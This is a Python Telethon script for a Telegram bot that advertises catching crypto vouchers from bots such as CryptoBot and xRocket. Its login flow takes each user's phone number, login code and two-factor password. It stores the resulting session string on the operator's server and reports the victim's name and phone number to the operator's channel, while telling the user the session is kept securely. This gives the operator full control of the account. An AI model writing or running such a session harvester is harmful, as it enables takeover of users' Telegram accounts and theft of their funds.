import os
import asyncio
import time
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ========== НАСТРОЙКИ ==========
api_id = int(os.getenv('API_ID', '27258770'))
api_hash = os.getenv('API_HASH', '')
bot_token = os.getenv('LOVEC', '')
channel_input = os.getenv('CHANNEL', '-4902536707')  # Ваша переменная

print("=" * 50)
print("🚀 LOVEС CHECK BOT - Session Creator Version")
print("=" * 50)

# Проверка
if not api_id or not api_hash or not bot_token:
    print("❌ ОШИБКА: API_ID, API_HASH или BOT_TOKEN не установлены!")
    exit(1)

print(f"✅ API_ID: {api_id}")
print(f"✅ BOT_TOKEN: {'установлен' if bot_token else 'НЕТ!'}")
print(f"✅ CHANNEL input: {channel_input}")

# ========== ПРЕОБРАЗОВАНИЕ CHANNEL ==========
# Обрабатываем разные форматы канала
def parse_channel(channel_str):
    """Преобразует строку канала в правильный формат"""
    if not channel_str:
        return None
    
    # Если это число (ID канала)
    try:
        if channel_str.startswith('-100'):
            return int(channel_str)
        elif channel_str.startswith('-'):
            # Добавляем -100 для ID каналов
            channel_id = int(channel_str)
            if channel_id < 0:
                # Приватные каналы имеют отрицательные ID с префиксом -100
                return -100 * abs(channel_id)
            return channel_id
        elif channel_str.lstrip('-').isdigit():
            # Просто число
            return int(channel_str)
    except:
        pass
    
    # Если это username (начинается с @)
    if channel_str.startswith('@'):
        return channel_str
    
    # Если это ссылка
    if 't.me/' in channel_str:
        # Извлекаем username из ссылки
        match = re.search(r't\.me/([a-zA-Z0-9_]+)', channel_str)
        if match:
            return '@' + match.group(1)
        return channel_str
    
    # По умолчанию пробуем как username
    if not channel_str.startswith('@'):
        return '@' + channel_str
    
    return channel_str

# Преобразуем канал
channel = parse_channel(channel_input)
print(f"✅ Parsed CHANNEL: {channel}")

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
user_sessions = {}
user_clients = {}
user_states = {}

# Бот для управления
bot = TelegramClient('session_bot', api_id, api_hash)

# ========== КОМАНДЫ БОТА ==========
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """Начало работы"""
    await event.reply(
        "🤖 **Добро пожаловать!**\n\n"
        "Я помогу создать сессию для ловли чеков.\n\n"
        "🔹 **Команды:**\n"
        "`/login` - Войти в ваш аккаунт\n"
        "`/status` - Статус сессии\n"
        "`/start_catch` - Начать ловлю чеков\n"
        "`/stop` - Остановить\n\n"
        "⚠️ **Внимание:** Используйте этот бот только в ЛС!"
    )

@bot.on(events.NewMessage(pattern='/login'))
async def login_handler(event):
    """Запуск процесса входа"""
    user_id = event.sender_id
    
    if user_id in user_clients:
        await event.reply("✅ Вы уже авторизованы!")
        return
    
    await event.reply(
        "📱 **Введите номер телефона:**\n\n"
        "Пример: `+79123456789`\n"
        "Или отправьте 'cancel' для отмены"
    )
    user_states[user_id] = 'waiting_phone'

@bot.on(events.NewMessage(pattern='/status'))
async def status_handler(event):
    """Проверка статуса"""
    user_id = event.sender_id
    
    if user_id in user_clients:
        try:
            me = await user_clients[user_id].get_me()
            await event.reply(
                f"✅ **Сессия активна!**\n\n"
                f"👤 Пользователь: {me.first_name}\n"
                f"📱 Телефон: {me.phone}\n"
                f"🆔 ID: {me.id}\n"
                f"🔗 Username: @{me.username if me.username else 'нет'}"
            )
        except:
            await event.reply("❌ Сессия есть, но не активна")
    else:
        await event.reply("❌ Сессия не создана. Используйте `/login`")

@bot.on(events.NewMessage(pattern='/start_catch'))
async def start_catch_handler(event):
    """Начать ловлю чеков"""
    user_id = event.sender_id
    
    if user_id not in user_clients:
        await event.reply("❌ Сначала авторизуйтесь: `/login`")
        return
    
    await event.reply("🎯 **Начинаю ловлю чеков...**")
    
    # Запускаем ловлю в фоне
    asyncio.create_task(catch_checks(user_id))

# ========== ОБРАБОТЧИК СООБЩЕНИЙ ==========
@bot.on(events.NewMessage)
async def message_handler(event):
    """Обработка всех сообщений"""
    user_id = event.sender_id
    text = event.text.strip()
    
    # Пропускаем команды
    if text.startswith('/'):
        return
    
    # Обработка состояний
    if user_id in user_states:
        state = user_states[user_id]
        
        if text.lower() == 'cancel':
            del user_states[user_id]
            await event.reply("❌ Отменено")
            return
        
        if state == 'waiting_phone':
            phone = text
            await event.reply(f"📱 Номер: {phone}\n\n📝 Отправьте код из Telegram:")
            
            # Создаем клиент
            client = TelegramClient(StringSession(), api_id, api_hash)
            user_clients[user_id] = client
            
            try:
                await client.connect()
                # Запрашиваем код
                await client.send_code_request(phone)
                user_states[user_id] = 'waiting_code'
                user_sessions[user_id] = {'phone': phone}
                
            except Exception as e:
                await event.reply(f"❌ Ошибка: {e}")
                del user_clients[user_id]
                del user_states[user_id]
        
        elif state == 'waiting_code':
            code = text.replace(' ', '')
            
            try:
                client = user_clients[user_id]
                session_data = user_sessions[user_id]
                
                # Авторизуемся
                await client.sign_in(
                    phone=session_data['phone'],
                    code=code
                )
                
                # Сохраняем сессию
                session_string = client.session.save()
                
                await event.reply(
                    f"✅ **Успешная авторизация!**\n\n"
                    f"🧠 Сессия сохранена\n"
                    f"📊 Теперь используйте `/start_catch` для ловли чеков\n\n"
                    f"🔒 Сессия сохранена безопасно"
                )
                
                # Очищаем состояние
                del user_states[user_id]
                
                # Сохраняем строку сессии в файл
                with open(f'session_{user_id}.txt', 'w') as f:
                    f.write(session_string)
                
                # Отправляем в канал уведомление
                me = await client.get_me()
                try:
                    await bot.send_message(
                        channel,
                        f"✅ **Новая сессия создана!**\n\n"
                        f"👤 Пользователь: {me.first_name}\n"
                        f"📱 Телефон: {me.phone}\n"
                        f"🕐 Время: {time.strftime('%H:%M:%S')}"
                    )
                except Exception as e:
                    print(f"⚠️ Не удалось отправить в канал: {e}")
                
            except Exception as e:
                await event.reply(f"❌ Ошибка входа: {e}")
                if 'PASSWORD_HASH_INVALID' in str(e):
                    await event.reply("🔐 Введите пароль двухфакторной аутентификации:")
                    user_states[user_id] = 'waiting_password'
                else:
                    if user_id in user_clients:
                        del user_clients[user_id]
                    if user_id in user_states:
                        del user_states[user_id]
                    if user_id in user_sessions:
                        del user_sessions[user_id]
        
        elif state == 'waiting_password':
            password = text
            
            try:
                client = user_clients[user_id]
                await client.sign_in(password=password)
                
                session_string = client.session.save()
                
                await event.reply(
                    f"✅ **Успешная авторизация с 2FA!**\n\n"
                    f"🧠 Сессия сохранена\n"
                    f"📊 Теперь используйте `/start_catch`"
                )
                
                del user_states[user_id]
                
                with open(f'session_{user_id}.txt', 'w') as f:
                    f.write(session_string)
                
            except Exception as e:
                await event.reply(f"❌ Ошибка пароля: {e}")
                if user_id in user_clients:
                    del user_clients[user_id]
                if user_id in user_states:
                    del user_states[user_id]
                if user_id in user_sessions:
                    del user_sessions[user_id]

# ========== ФУНКЦИЯ ЛОВЛИ ЧЕКОВ ==========
async def catch_checks(user_id):
    """Ловля чеков для конкретного пользователя"""
    if user_id not in user_clients:
        return
    
    client = user_clients[user_id]
    
    try:
        # Получаем информацию о пользователе
        me = await client.get_me()
        try:
            await bot.send_message(
                channel,
                f"🎯 **Начата ловля чеков!**\n\n"
                f"👤 Пользователь: {me.first_name}\n"
                f"📱 Телефон: {me.phone}\n"
                f"⏰ Время: {time.strftime('%H:%M:%S')}"
            )
        except Exception as e:
            print(f"⚠️ Не удалось отправить в канал: {e}")
        
        # Список чатов для мониторинга (ID ботов с чеками)
        monitor_chats = [
            'CryptoBot',          # @CryptoBot
            'tonRocketBot',       # @tonRocketBot
            'wallet',             # @wallet
            'xrocket',            # @xrocket
            'send',               # @send
            'CryptoTestnetBot',   # @CryptoTestnetBot
        ]
        
        # Подписываемся на чаты
        for chat in monitor_chats:
            try:
                await client.send_message(chat, '/start')
                await asyncio.sleep(1)
            except:
                pass
        
        # Обработчик сообщений для ловли чеков
        @client.on(events.NewMessage)
        async def check_handler(event):
            """Обработчик чеков"""
            try:
                text = event.text or ''
                
                # Ищем чеки
                check_patterns = [
                    't.me/CryptoBot?start=',
                    't.me/send?start=',
                    't.me/tonRocketBot?start=',
                    't.me/wallet?start=',
                    't.me/xrocket?start=',
                    't.me/CryptoTestnetBot?start=',
                ]
                
                for pattern in check_patterns:
                    if pattern in text:
                        # Извлекаем код
                        match = re.search(r'start=([A-Za-z0-9_-]+)', text)
                        if match:
                            code = match.group(1)
                            
                            # Активируем чек
                            bot_name = pattern.split('?')[0].split('/')[-1]
                            await client.send_message(bot_name, f'/start {code}')
                            
                            # Отправляем уведомление
                            try:
                                await bot.send_message(
                                    channel,
                                    f"💰 **Чек активирован!**\n\n"
                                    f"🎯 Код: `{code[:10]}...`\n"
                                    f"🤖 Бот: @{bot_name}\n"
                                    f"👤 От: {me.first_name}\n"
                                    f"⏰ Время: {time.strftime('%H:%M:%S')}"
                                )
                            except:
                                pass
                            
                            print(f"✅ Активирован чек: {code}")
                            await asyncio.sleep(2)  # Задержка между чеками
                            break
                
            except Exception as e:
                print(f"❌ Ошибка обработки: {e}")
        
        print(f"✅ Ловля чеков запущена для {me.first_name}")
        
        # Бесконечный цикл
        await client.run_until_disconnected()
        
    except Exception as e:
        try:
            await bot.send_message(
                channel,
                f"❌ **Ошибка ловли чеков!**\n\n"
                f"👤 Пользователь: ID{user_id}\n"
                f"⚠️ Ошибка: {str(e)[:100]}"
            )
        except:
            pass
        print(f"❌ Ошибка catch_checks: {e}")

# ========== ЗАПУСК ==========
async def main():
    """Основная функция"""
    print("🔄 Запускаю бота-создателя сессий...")
    
    try:
        # Запускаем бота
        await bot.start(bot_token=bot_token)
        me = await bot.get_me()
        print(f"✅ Бот запущен: @{me.username}")
        
        # Отправляем сообщение в канал
        try:
            await bot.send_message(
                channel,
                f"🤖 **Session Creator Bot запущен!**\n\n"
                f"⏰ Время: {time.strftime('%H:%M:%S')}\n"
                f"🔗 Бот: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"📱 Напишите боту в ЛС для создания сессии"
            )
            print(f"📢 Сообщение отправлено в канал: {channel}")
        except Exception as e:
            print(f"⚠️ Не удалось отправить в канал: {e}")
            print(f"💡 Проверьте формат канала. Текущий: {channel}")
            print("💡 Попробуйте использовать ID канала с префиксом -100")
        
        print("=" * 50)
        print("✅ ВСЁ ЗАПУЩЕНО!")
        print("=" * 50)
        print(f"🔗 Ваш бот: @{me.username}")
        print(f"📢 Канал: {channel}")
        print("=" * 50)
        print("📋 Инструкция:")
        print("1. Напишите боту в ЛС /start")
        print("2. Используйте /login для входа")
        print("3. Введите номер телефона и код")
        print("4. Используйте /start_catch для ловли чеков")
        print("=" * 50)
        
        # Бесконечный цикл
        await bot.run_until_disconnected()
        
    except Exception as e:
        print(f"❌ Ошибка запуска: {e}")
        import traceback
        traceback.print_exc()

# ========== ЗАПУСК ПРОГРАММЫ ==========
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Бот остановлен")
    except Exception as e:
        print(f"❌ Фатальная ошибка: {e}")
